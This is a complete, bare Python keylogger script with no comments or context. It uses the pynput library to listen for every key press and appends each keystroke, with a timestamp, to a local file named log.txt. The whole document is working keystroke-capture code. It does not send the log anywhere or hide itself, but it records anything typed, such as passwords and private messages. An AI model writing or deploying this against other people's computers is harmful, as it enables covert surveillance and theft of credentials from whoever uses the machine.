from pynput.keyboard import Listener
from datetime import datetime


def log_keystroke(key):
    key = str(key).replace("'", "")
    with open("log.txt", 'a') as f:
        f.write(f"{datetime.now()}: {key}\n")
with Listener(on_press=log_keystroke) as l:
    l.join()